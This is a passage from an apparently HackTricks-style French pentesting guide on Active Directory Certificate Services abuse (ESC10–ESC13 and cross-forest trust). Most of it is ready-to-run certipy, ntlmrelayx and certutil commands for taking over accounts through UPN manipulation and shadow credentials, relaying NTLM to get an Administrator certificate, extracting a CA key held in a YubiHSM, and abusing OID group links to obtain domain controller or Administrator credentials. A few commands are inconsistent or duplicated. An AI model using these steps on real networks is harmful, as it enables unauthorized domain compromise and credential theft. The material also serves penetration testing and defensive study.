Initialement, le hachage de `Jane` est récupéré en utilisant les Shadow Credentials, exploitant le `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ensuite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, omettant délibérément la partie `@corp.local` pour éviter une violation de contrainte.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Suite à cela, un certificat permettant l'authentification du client est demandé en tant que `Jane`, en utilisant le modèle par défaut `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est ensuite rétabli à son original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L'authentification avec le certificat obtenu produira le NT hash de `Administrator@corp.local`, nécessitant la spécification du domaine dans la commande en raison de l'absence de détails de domaine dans le certificat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Avec le `CertificateMappingMethods` contenant le bit flag `UPN` (`0x4`), un compte A avec des permissions `GenericWrite` peut compromettre n'importe quel compte B manquant d'une propriété `userPrincipalName`, y compris les comptes machines et le compte administrateur de domaine intégré `Administrator`.

Ici, l'objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` via les Shadow Credentials, en tirant parti du `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Le `userPrincipalName` de `Jane` est alors défini sur `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificat pour l'authentification du client est demandé en tant que `Jane` en utilisant le modèle `User` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Le `userPrincipalName` de `Jane` est rétabli à son état d'origine après ce processus.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Pour s'authentifier via Schannel, l'option `-ldap-shell` de Certipy est utilisée, indiquant le succès de l'authentification comme `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
À travers le shell LDAP, des commandes telles que `set_rbcd` permettent des attaques de Délégation Contraignante Basée sur les Ressources (RBCD), compromettant potentiellement le contrôleur de domaine.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Cette vulnérabilité s'étend également à tout compte utilisateur manquant un `userPrincipalName` ou lorsque celui-ci ne correspond pas au `sAMAccountName`, le `Administrator@corp.local` par défaut étant une cible privilégiée en raison de ses privilèges LDAP élevés et de l'absence d'un `userPrincipalName` par défaut.

## Relaying NTLM to ICPR - ESC11

### Explication

Si le serveur CA n'est pas configuré avec `IF_ENFORCEENCRYPTICERTREQUEST`, il peut effectuer des attaques de relais NTLM sans signature via le service RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Vous pouvez utiliser `certipy` pour énumérer si `Enforce Encryption for Requests` est désactivé et certipy affichera les vulnérabilités `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scénario d'abus

Il est nécessaire de configurer un serveur de relais :
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Note : Pour les contrôleurs de domaine, nous devons spécifier `-template` dans DomainController.

Ou en utilisant [le fork de sploutchy d'impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Accès shell à ADCS CA avec YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer l'Autorité de Certification pour la stocker sur un dispositif externe comme le "Yubico YubiHSM2".

Si un dispositif USB est connecté au serveur CA via un port USB, ou un serveur de dispositif USB dans le cas où le serveur CA est une machine virtuelle, une clé d'authentification (parfois appelée "mot de passe") est requise pour que le Fournisseur de Stockage de Clés génère et utilise des clés dans le YubiHSM.

Cette clé/mot de passe est stockée dans le registre sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en texte clair.

Référence [ici](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scénario d'abus

Si la clé privée de la CA est stockée sur un dispositif USB physique lorsque vous avez obtenu un accès shell, il est possible de récupérer la clé.

Tout d'abord, vous devez obtenir le certificat CA (celui-ci est public) et ensuite :
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Enfin, utilisez la commande certutil `-sign` pour forger un nouveau certificat arbitraire en utilisant le certificat CA et sa clé privée.

## Abus de lien de groupe OID - ESC13

### Explication

L'attribut `msPKI-Certificate-Policy` permet d'ajouter la politique d'émission au modèle de certificat. Les objets `msPKI-Enterprise-Oid` responsables de l'émission des politiques peuvent être découverts dans le Contexte de Nomination de Configuration (CN=OID,CN=Public Key Services,CN=Services) du conteneur OID PKI. Une politique peut être liée à un groupe AD en utilisant l'attribut `msDS-OIDToGroupLink` de cet objet, permettant à un système d'autoriser un utilisateur qui présente le certificat comme s'il était membre du groupe. [Référence ici](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

En d'autres termes, lorsqu'un utilisateur a la permission d'enrôler un certificat et que le certificat est lié à un groupe OID, l'utilisateur peut hériter des privilèges de ce groupe.

Utilisez [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) pour trouver OIDToGroupLink :
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scénario d'abus

Trouvez une permission utilisateur qu'il peut utiliser `certipy find` ou `Certify.exe find /showAllPermissions`.

Si `John` a la permission d'enrôler `VulnerableTemplate`, l'utilisateur peut hériter des privilèges du groupe `VulnerableGroup`.

Tout ce qu'il a besoin de faire est de spécifier le modèle, il obtiendra un certificat avec des droits OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Compromission des forêts avec des certificats expliquée à la voix passive

### Rupture des relations de confiance entre forêts par des CAs compromis

La configuration pour **l'inscription inter-forêts** est relativement simple. Le **certificat CA racine** de la forêt de ressources est **publié dans les forêts de comptes** par les administrateurs, et les certificats **CA d'entreprise** de la forêt de ressources sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA dans chaque forêt de comptes**. Pour clarifier, cet arrangement accorde à la **CA dans la forêt de ressources un contrôle complet** sur toutes les autres forêts pour lesquelles elle gère la PKI. Si cette CA est **compromise par des attaquants**, des certificats pour tous les utilisateurs dans les forêts de ressources et de comptes pourraient être **falsifiés par eux**, brisant ainsi la frontière de sécurité de la forêt.

### Droits d'inscription accordés aux principaux étrangers

Dans des environnements multi-forêts, la prudence est de mise concernant les CAs d'entreprise qui **publient des modèles de certificats** permettant aux **Utilisateurs Authentifiés ou aux principaux étrangers** (utilisateurs/groupes externes à la forêt à laquelle appartient la CA d'entreprise) **des droits d'inscription et d'édition**.\
Lors de l'authentification à travers une relation de confiance, le **SID des Utilisateurs Authentifiés** est ajouté au jeton de l'utilisateur par AD. Ainsi, si un domaine possède une CA d'entreprise avec un modèle qui **permet des droits d'inscription aux Utilisateurs Authentifiés**, un modèle pourrait potentiellement être **inscrit par un utilisateur d'une autre forêt**. De même, si **des droits d'inscription sont explicitement accordés à un principal étranger par un modèle**, une **relation de contrôle d'accès inter-forêts est ainsi créée**, permettant à un principal d'une forêt de **s'inscrire dans un modèle d'une autre forêt**.

Les deux scénarios entraînent une **augmentation de la surface d'attaque** d'une forêt à l'autre. Les paramètres du modèle de certificat pourraient être exploités par un attaquant pour obtenir des privilèges supplémentaires dans un domaine étranger.


{{#include ../../../banners/hacktricks-training.md}}
